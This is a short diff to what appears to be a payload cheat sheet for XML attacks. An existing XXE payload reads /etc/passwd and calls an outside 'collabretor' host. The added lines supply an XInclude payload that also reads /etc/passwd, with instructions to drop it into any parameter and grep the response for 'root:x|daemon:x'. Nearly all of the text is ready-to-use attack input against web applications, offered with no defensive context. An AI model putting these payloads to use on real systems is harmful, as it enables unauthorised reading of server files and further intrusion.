@@ -29,3 +29,8 @@ Coded by: RobinTrigon | 3rr0r-404
 <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY sp SYSTEM "https://collabretor/">]><r>&xxe;&sp;</r>
 ```
 
+### Peram Based
+#### Just replace any peramiter with it and egrep "root:x|daemon:x"
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
